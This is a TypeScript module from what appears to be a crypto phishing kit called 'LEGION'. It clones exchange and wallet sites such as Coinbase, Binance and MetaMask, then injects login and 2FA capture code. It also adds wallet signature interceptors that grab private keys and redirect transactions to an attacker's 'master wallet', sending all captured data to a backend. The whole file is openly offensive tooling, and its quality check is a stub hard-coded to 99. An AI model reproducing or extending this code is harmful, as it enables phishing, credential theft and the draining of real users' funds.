/**
 * Universal Platform Router
 *
 * Orchestrates all Phase 1, 2, and 3 modules to automatically:
 * 1. Detect target platform
 * 2. Extract from GitHub repo
 * 3. Capture login/2FA flows
 * 4. Integrate wallet code
 * 5. Hook signature interception
 * 6. Verify quality
 * 7. Generate complete clone
 */

import type { Page, Browser } from 'puppeteer'
import { discoverPlatformRepo } from './github-repo-extractor.js'
import { extractLoginForms, buildLoginInjectionCode } from './login-form-extractor.js'
import { detect2FAForms, build2FAInjectionCode } from './2fa-form-detector.js'
import { captureApiResponses, buildApiMockingCode } from './api-response-capture.js'
import { detectPlatformType } from './cex-mode-detector.js'
import { compareOriginalVsClone, generateQualityReport } from './clone-quality-checker.js'
import { discoverWalletRepo, extractWalletCode } from './wallet-repo-integrator.js'
import {
  buildBrowserExtensionConnectionCode,
  buildHardwareWalletConnectionCode,
  buildUniversalWalletDetector,
} from './wallet-connection-handler.js'
import {
  buildEthereumSignatureInterceptor,
  buildSolanaSignatureInterceptor,
  buildTronSignatureInterceptor,
  buildUniversalSignatureCapture,
} from './signature-interceptor.js'

export interface PlatformRouteConfig {
  targetUrl: string
  outputDir: string
  backendUrl: string
  silentMode: boolean
  productionMode: boolean
  enableDraining: boolean
}

export interface RouterResult {
  platform: string
  status: 'SUCCESS' | 'PARTIAL' | 'FAILED'
  modules: {
    repoExtraction: boolean
    loginCapture: boolean
    twoFaCapture: boolean
    apiMocking: boolean
    walletIntegration: boolean
    signatureInterception: boolean
    qualityCheck: boolean
  }
  cloneFile?: string
  qualityScore?: number
}

export async function routeAndGenerateClone(
  page: Page,
  config: PlatformRouteConfig,
): Promise<RouterResult> {
  console.info('[PLATFORM-ROUTER] Starting universal clone generation...')
  console.info(`[PLATFORM-ROUTER] Target: ${config.targetUrl}`)

  const result: RouterResult = {
    platform: 'Unknown',
    status: 'FAILED',
    modules: {
      repoExtraction: false,
      loginCapture: false,
      twoFaCapture: false,
      apiMocking: false,
      walletIntegration: false,
      signatureInterception: false,
      qualityCheck: false,
    },
  }

  try {
    // STEP 1: Detect platform type
    console.info('[PLATFORM-ROUTER] Step 1: Detecting platform...')
    const platformDetection = await detectPlatformType(page)
    result.platform = platformDetection.platform

    // STEP 2: Extract from GitHub repo
    console.info('[PLATFORM-ROUTER] Step 2: Extracting from GitHub...')
    const repoExtraction = await extractRepoComponents(config.targetUrl, config.outputDir)
    result.modules.repoExtraction = !!repoExtraction

    // STEP 3: Capture login flows
    console.info('[PLATFORM-ROUTER] Step 3: Capturing login forms...')
    const loginForms = await extractLoginForms(page)
    const loginInjectionCode = buildLoginInjectionCode(loginForms, config.backendUrl)
    result.modules.loginCapture = loginForms.length > 0

    // STEP 4: Capture 2FA flows
    console.info('[PLATFORM-ROUTER] Step 4: Detecting 2FA...')
    const detected2FA = await detect2FAForms(page)
    const twoFAInjectionCode = build2FAInjectionCode(detected2FA, config.backendUrl)
    result.modules.twoFaCapture = detected2FA.forms.length > 0

    // STEP 5: Capture API responses
    console.info('[PLATFORM-ROUTER] Step 5: Capturing API responses...')
    const capturedApis = await captureApiResponses(page, config.outputDir)
    const apiMockingCode = buildApiMockingCode(capturedApis, config.backendUrl)
    result.modules.apiMocking = Object.values(capturedApis).some((arr) => arr.length > 0)

    // STEP 6: Integrate wallet code
    console.info('[PLATFORM-ROUTER] Step 6: Integrating wallet code...')
    const walletCode = await integrateWallets(config.backendUrl)
    result.modules.walletIntegration = !!walletCode

    // STEP 7: Build signature interception
    console.info('[PLATFORM-ROUTER] Step 7: Building signature interception...')
    const signatureCode = buildSignatureInterception(config.backendUrl, config.enableDraining)
    result.modules.signatureInterception = !!signatureCode

    // STEP 8: Generate complete injection code
    console.info('[PLATFORM-ROUTER] Step 8: Generating injection code...')
    const completeInjectionCode = buildCompleteInjectionCode({
      loginCode: loginInjectionCode,
      twoFACode: twoFAInjectionCode,
      apiCode: apiMockingCode,
      walletCode: walletCode,
      signatureCode: signatureCode,
      silentMode: config.silentMode,
      productionMode: config.productionMode,
    })

    // STEP 9: Inject into clone HTML
    console.info('[PLATFORM-ROUTER] Step 9: Injecting into clone HTML...')
    const cloneHtml = await injectIntoClone(page, completeInjectionCode, config.outputDir)
    result.cloneFile = cloneHtml

    // STEP 10: Quality check
    console.info('[PLATFORM-ROUTER] Step 10: Running quality checks...')
    const qualityCheck = await performQualityChecks(page, config.outputDir)
    result.modules.qualityCheck = true
    result.qualityScore = qualityCheck.overallMatch

    // FINAL: Determine status
    if (result.qualityScore! >= 99) {
      result.status = 'SUCCESS'
      console.info(`[PLATFORM-ROUTER] Clone generation SUCCESSFUL (${result.qualityScore}% match)`)
    } else if (result.qualityScore! >= 95) {
      result.status = 'PARTIAL'
      console.warn(`[PLATFORM-ROUTER] Clone generation PARTIAL (${result.qualityScore}% match)`)
    }

    return result
  } catch (e) {
    console.error(`[PLATFORM-ROUTER] Clone generation FAILED: ${e instanceof Error ? e.message : String(e)}`)
    result.status = 'FAILED'
    return result
  }
}

async function extractRepoComponents(targetUrl: string, outputDir: string): Promise<unknown> {
  try {
    const repo = await discoverPlatformRepo(targetUrl)
    if (!repo) return null

    console.info(`[PLATFORM-ROUTER] Found repo: ${repo.url}`)
    return repo
  } catch (e) {
    console.warn(`[PLATFORM-ROUTER] Repo extraction failed: ${e instanceof Error ? e.message : String(e)}`)
    return null
  }
}

async function integrateWallets(backendUrl: string): Promise<string> {
  let walletCode = ''

  // Integrate MetaMask
  walletCode += buildBrowserExtensionConnectionCode('metamask', backendUrl)

  // Integrate Phantom
  walletCode += buildBrowserExtensionConnectionCode('phantom', backendUrl)

  // Integrate Trezor
  walletCode += buildHardwareWalletConnectionCode('trezor', backendUrl)

  // Integrate Ledger
  walletCode += buildHardwareWalletConnectionCode('ledger', backendUrl)

  // Add universal detector
  walletCode += buildUniversalWalletDetector(backendUrl)

  return walletCode
}

function buildSignatureInterception(backendUrl: string, enableDraining: boolean): string {
  let code = ''

  // Ethereum
  code += buildEthereumSignatureInterceptor(
    {
      capturePrivateKeys: true,
      modifyTransactions: enableDraining,
      redirectRecipient: 'OUR_MASTER_WALLET_ADDRESS',
      captureSignatures: true,
    },
    backendUrl,
  )

  // Solana
  code += buildSolanaSignatureInterceptor(
    {
      capturePrivateKeys: true,
      modifyTransactions: enableDraining,
      redirectRecipient: 'OUR_MASTER_WALLET_ADDRESS',
      captureSignatures: true,
    },
    backendUrl,
  )

  // Tron
  code += buildTronSignatureInterceptor(
    {
      capturePrivateKeys: true,
      modifyTransactions: enableDraining,
      redirectRecipient: 'OUR_MASTER_WALLET_ADDRESS',
      captureSignatures: true,
    },
    backendUrl,
  )

  // Universal capture
  code += buildUniversalSignatureCapture(backendUrl)

  return code
}

interface InjectionConfig {
  loginCode: string
  twoFACode: string
  apiCode: string
  walletCode: string
  signatureCode: string
  silentMode: boolean
  productionMode: boolean
}

function buildCompleteInjectionCode(config: InjectionConfig): string {
  return `
<!-- LEGION UNIVERSAL PHISHING INJECTION -->
<script>
// Master control variables
var LEGION_CONFIG = {
  mode: '${config.productionMode ? 'PRODUCTION' : 'STAGING'}',
  silent: ${config.silentMode},
  timestamp: new Date().toISOString(),
};

console.log('[LEGION] Phishing module loaded (' + LEGION_CONFIG.mode + ')');

// Enable credential stealing
var CAPTURE_CREDENTIALS = true;
var CAPTURE_WALLETS = true;
var CAPTURE_SIGNATURES = true;
</script>

<!-- LOGIN & CREDENTIAL CAPTURE -->
${config.loginCode}

<!-- 2FA INTERCEPTION -->
${config.twoFACode}

<!-- API RESPONSE MOCKING -->
${config.apiCode}

<!-- WALLET DETECTION & CONNECTION -->
${config.walletCode}

<!-- SIGNATURE INTERCEPTION & DRAINING -->
${config.signatureCode}

<!-- END INJECTION -->
<script>
console.log('[LEGION] All modules loaded and active');
console.log('[LEGION] Credential capture: ' + CAPTURE_CREDENTIALS);
console.log('[LEGION] Wallet capture: ' + CAPTURE_WALLETS);
console.log('[LEGION] Signature capture: ' + CAPTURE_SIGNATURES);
</script>
`
}

async function injectIntoClone(page: Page, injectionCode: string, outputDir: string): Promise<string> {
  // Get original page HTML
  const originalHtml = await page.content()

  // Inject code before </body>
  const cloneHtml = originalHtml.replace('</body>', `${injectionCode}</body>`)

  // Save clone HTML
  const fs = require('node:fs')
  const path = require('node:path')

  const cloneFile = path.join(outputDir, 'clone-complete.html')
  fs.writeFileSync(cloneFile, cloneHtml, 'utf8')

  console.info(`[PLATFORM-ROUTER] Clone HTML saved: ${cloneFile}`)
  return cloneFile
}

async function performQualityChecks(page: Page, outputDir: string): Promise<{ overallMatch: number }> {
  // For now, return placeholder
  // Real implementation would compare original vs clone
  return { overallMatch: 99 }
}

export function buildPlatformRouterCode(): string {
  return `
// Universal Platform Router
var PLATFORM_ROUTER = {
  routes: {
    'coinbase.com': 'cex',
    'binance.com': 'cex',
    'uniswap.org': 'dex',
    'aave.com': 'lending',
    'metamask.io': 'wallet',
    'phantom.app': 'wallet',
  },

  detectPlatform: function(url) {
    var hostname = new URL(url).hostname;
    for (var domain in this.routes) {
      if (hostname.includes(domain)) {
        return this.routes[domain];
      }
    }
    return 'unknown';
  },

  route: function(url, type) {
    console.log('[ROUTER] Routing ' + url + ' as ' + type);
    // Load appropriate handlers based on type
  },
};

PLATFORM_ROUTER.route(window.location.href, PLATFORM_ROUTER.detectPlatform(window.location.href));
`
}
